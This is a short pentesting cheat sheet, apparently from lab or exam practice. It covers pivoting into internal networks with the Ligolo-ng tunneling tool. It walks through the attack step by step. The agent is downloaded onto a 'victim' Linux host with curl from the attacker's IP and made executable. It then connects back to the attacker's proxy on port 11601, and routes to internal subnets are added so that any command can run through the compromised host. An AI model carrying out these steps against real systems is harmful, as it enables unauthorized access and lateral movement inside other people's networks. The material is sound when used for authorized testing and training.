
TUNNEL ALL YOUR TRAFFIC THROUGH THIS MACHINE :

Ligolo-ng creates a virtual network interface (TUN) on your attacking machine.
You add routes to internal subnets, allowing applications to communicate through the tunnel without individually configuring SOCKS support.
You don't have to prepend every single command with `proxychains`

Download : 
```
https://github.com/nicocha30/ligolo-ng/releases
```
Download the agent : (this will be on the victim machine to connect back to us)
```
ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
```
Download the proxy : 
```
ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
```
To unzip : 
```
tar -xvzf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
```

Transfer the agent to the victim Linux machine :
```
curl <KALI IP>/agent -o agent
chmod +x agent
```

On kali/attacker machine :
```
./proxy -selfcert
```
Enable Ligolo-ng WebUI? No
Allow CORS Access from https://webui.ligolo.ng? No

Setup a new interface on kali 
```
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

Ways to find routes to add :
```
ip a
cat /proc/net/fib_trie
cat /proc/net/dev
cat /proc/net/arp
```

now that we have the route , we can now connect to it :

On victim :
```
./agent -connect <KALI IP>:11601 -ignore-cert
```

we will get the connection back on kali
on kali ligolo session : 
```
session
```
it will ask to specify the session 
ex. enter `1` 

==🔵start the tunneling :==
on kali ligolo session : 
```
start
```

NOW YOU CAN RUN ANY COMMAND FROM KALI

to see the running routes :
```
iflist
```
to add a new route :
```
interface_add_route --name ligolo --route 172.28.96.0/20
```

to see the help you can enter in the ligolo terminal :
```
help
```
